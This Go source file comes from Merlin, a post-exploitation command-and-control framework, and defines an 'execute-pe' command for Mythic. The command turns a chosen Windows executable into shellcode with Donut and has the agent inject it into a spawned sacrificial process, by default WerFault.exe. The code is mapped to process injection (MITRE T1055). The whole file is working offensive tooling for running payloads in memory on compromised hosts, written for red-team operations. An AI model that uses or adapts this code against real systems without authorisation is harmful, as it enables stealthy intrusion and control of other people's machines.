/*
Merlin is a post-exploitation command and control framework.

This file is part of Merlin.
Copyright (C) 2023  Russel Van Tuyl

Merlin is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as
published by the Free Software Foundation, either version 3 of the License, or any later version.

Merlin is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
*/

package commands

import (
	"bytes"
	"encoding/base64"
	"github.com/Ne0nd0g/merlin/pkg/jobs"

	// Mythic
	"fmt"
	"github.com/Binject/go-donut/donut"
	structs "github.com/MythicMeta/MythicContainer/agent_structs"
)

// executePE returns a Mythic Command structure that is registered with the Mythic server
func executePE() structs.Command {
	attr := structs.CommandAttribute{
		SupportedOS: []string{structs.SUPPORTED_OS_WINDOWS},
	}

	filename := structs.CommandParameter{
		Name:                                    "filename",
		ModalDisplayName:                        "Executable",
		CLIName:                                 "executable",
		ParameterType:                           structs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
		Description:                             "The Windows executable (PE file) you want to run",
		Choices:                                 []string{""},
		DefaultValue:                            "",
		SupportedAgents:                         nil,
		SupportedAgentBuildParameters:           nil,
		ChoicesAreAllCommands:                   false,
		ChoicesAreLoadedCommands:                false,
		FilterCommandChoicesByCommandAttributes: nil,
		DynamicQueryFunction:                    GetFileList,
		ParameterGroupInformation: []structs.ParameterGroupInfo{
			{
				ParameterIsRequired:   true,
				GroupName:             "Default",
				UIModalPosition:       0,
				AdditionalInformation: nil,
			},
		},
	}

	file := structs.CommandParameter{
		Name:                                    "file",
		ModalDisplayName:                        "Executable",
		CLIName:                                 "file",
		ParameterType:                           structs.COMMAND_PARAMETER_TYPE_FILE,
		Description:                             "The Windows executable (PE file) you want to run",
		Choices:                                 nil,
		DefaultValue:                            nil,
		SupportedAgents:                         nil,
		SupportedAgentBuildParameters:           nil,
		ChoicesAreAllCommands:                   false,
		ChoicesAreLoadedCommands:                false,
		FilterCommandChoicesByCommandAttributes: nil,
		DynamicQueryFunction:                    nil,
		ParameterGroupInformation: []structs.ParameterGroupInfo{
			{
				ParameterIsRequired:   true,
				GroupName:             "New File",
				UIModalPosition:       0,
				AdditionalInformation: nil,
			},
		},
	}

	arguments := structs.CommandParameter{
		Name:                                    "arguments",
		ModalDisplayName:                        "Executable Arguments",
		CLIName:                                 "args",
		ParameterType:                           structs.COMMAND_PARAMETER_TYPE_STRING,
		Description:                             "Arguments to execute the PE with",
		Choices:                                 nil,
		DefaultValue:                            "",
		SupportedAgents:                         nil,
		SupportedAgentBuildParameters:           nil,
		ChoicesAreAllCommands:                   false,
		ChoicesAreLoadedCommands:                false,
		FilterCommandChoicesByCommandAttributes: nil,
		DynamicQueryFunction:                    nil,
		ParameterGroupInformation: []structs.ParameterGroupInfo{
			{
				ParameterIsRequired:   false,
				GroupName:             "Default",
				UIModalPosition:       1,
				AdditionalInformation: nil,
			},
			{
				ParameterIsRequired:   false,
				GroupName:             "New File",
				UIModalPosition:       1,
				AdditionalInformation: nil,
			},
		},
	}

	spawnto := structs.CommandParameter{
		Name:                                    "spawnto",
		ModalDisplayName:                        "SpawnTo",
		CLIName:                                 "spawnto",
		ParameterType:                           structs.COMMAND_PARAMETER_TYPE_STRING,
		Description:                             "The child process that will be started to execute the shellcode in",
		Choices:                                 nil,
		DefaultValue:                            "C:\\Windows\\System32\\WerFault.exe",
		SupportedAgents:                         nil,
		SupportedAgentBuildParameters:           nil,
		ChoicesAreAllCommands:                   false,
		ChoicesAreLoadedCommands:                false,
		FilterCommandChoicesByCommandAttributes: nil,
		DynamicQueryFunction:                    nil,
		ParameterGroupInformation: []structs.ParameterGroupInfo{
			{
				ParameterIsRequired:   true,
				GroupName:             "Default",
				UIModalPosition:       2,
				AdditionalInformation: nil,
			},
			{
				ParameterIsRequired:   true,
				GroupName:             "New File",
				UIModalPosition:       2,
				AdditionalInformation: nil,
			},
		},
	}

	spawntoArgs := structs.CommandParameter{
		Name:                                    "spawntoargs",
		ModalDisplayName:                        "SpawnTo Agruments",
		CLIName:                                 "spawntoargs",
		ParameterType:                           structs.COMMAND_PARAMETER_TYPE_STRING,
		Description:                             "arguments to create the spawnto process with, if any",
		Choices:                                 nil,
		DefaultValue:                            "",
		SupportedAgents:                         nil,
		SupportedAgentBuildParameters:           nil,
		ChoicesAreAllCommands:                   false,
		ChoicesAreLoadedCommands:                false,
		FilterCommandChoicesByCommandAttributes: nil,
		DynamicQueryFunction:                    nil,
		ParameterGroupInformation: []structs.ParameterGroupInfo{
			{
				ParameterIsRequired:   false,
				GroupName:             "Default",
				UIModalPosition:       3,
				AdditionalInformation: nil,
			},
			{
				ParameterIsRequired:   false,
				GroupName:             "New File",
				UIModalPosition:       3,
				AdditionalInformation: nil,
			},
		},
	}

	command := structs.Command{
		Name:                  "execute-pe",
		NeedsAdminPermissions: false,
		HelpString:            "execute-pe <executable name> <executable args> <spawnto> <spawnto-args>",
		Description: "Convert a Windows PE into shellcode with Donut, execute it in the SpawnTo process, and return " +
			"the output Change the Parameter Group to \"Default\" to use a file that was previously registered with " +
			"Mythic and \"New File\" to register and use a new file from your host OS.",
		Version:                        0,
		SupportedUIFeatures:            nil,
		Author:                         "@Ne0nd0g",
		MitreAttackMappings:            []string{"T1055"},
		ScriptOnlyCommand:              false,
		CommandAttributes:              attr,
		CommandParameters:              []structs.CommandParameter{file, filename, arguments, spawnto, spawntoArgs},
		AssociatedBrowserScript:        nil,
		TaskFunctionOPSECPre:           nil,
		TaskFunctionCreateTasking:      executePECreateTasking,
		TaskFunctionProcessResponse:    nil,
		TaskFunctionOPSECPost:          nil,
		TaskFunctionParseArgString:     taskFunctionParseArgString,
		TaskFunctionParseArgDictionary: taskFunctionParseArgDictionary,
		TaskCompletionFunctions:        nil,
	}

	return command
}

func executePECreateTasking(task *structs.PTTaskMessageAllData) (resp structs.PTTaskCreateTaskingMessageResponse) {
	pkg := "mythic/container/commands/executePE/executePECreateTask()"
	resp.TaskID = task.Task.ID

	// Get the file as a byte array, its name, and any errors
	data, filename, err := GetFile(task)
	if err != nil {
		resp.Error = fmt.Sprintf("%s: %s", pkg, err)
		resp.Success = false
		return
	}

	// Arguments
	var arguments string
	arguments, err = task.Args.GetStringArg("arguments")
	if err != nil {
		resp.Error = fmt.Sprintf("there was an error getting the \"arguments\" command argument: %s", err)
		resp.Success = false
		return
	}

	// SpawnTo
	var spawnto string
	spawnto, err = task.Args.GetStringArg("spawnto")
	if err != nil {
		resp.Error = fmt.Sprintf("there was an error getting the \"spawnto\" command argument: %s", err)
		resp.Success = false
		return
	}

	// SpawnTo Args
	var spawntoargs string
	spawntoargs, err = task.Args.GetStringArg("spawntoargs")
	if err != nil {
		resp.Error = fmt.Sprintf("there was an error getting the \"spawntoargs\" command argument: %s", err)
		resp.Success = false
		return
	}

	// Donut Config
	config := donut.DefaultConfig()
	config.Arch = donut.X84
	config.Type = donut.DONUT_MODULE_EXE
	config.ExitOpt = 2
	config.Entropy = 3
	config.Parameters = arguments
	config.Verbose = false

	// Get the PE and turn it into a *bytes.buffer
	buff := bytes.NewBuffer(data)
	var shellcode *bytes.Buffer
	shellcode, err = donut.ShellcodeFromBytes(buff, config)
	if err != nil {
		resp.Error = fmt.Sprintf("there was an error generating the shellcode from Donut: %s", err)
		resp.Success = false
		return
	}

	//  Merlin Job
	// Command: createprocess
	// Arguments:
	// 1. File contents as Base64 string
	// 2. SpawnTo executable file path on host where the Agent is running
	// 3. SpawnTo arguments

	job := jobs.Command{
		Command: "createprocess",
		Args:    []string{base64.StdEncoding.EncodeToString(shellcode.Bytes()), spawnto, spawntoargs},
	}

	mythicJob, err := ConvertMerlinJobToMythicTask(job, jobs.MODULE)
	if err != nil {
		resp.Error = fmt.Sprintf("mythic/container/commands/executePE/executPECreateTasking(): %s", err)
		resp.Success = false
		return
	}

	task.Args.SetManualArgs(mythicJob)

	disp := fmt.Sprintf("%s %s, SpawnTo: %s, SpawnTo Arguments: %s", filename, arguments, spawnto, spawntoargs)
	resp.DisplayParams = &disp
	resp.Success = true
	return
}
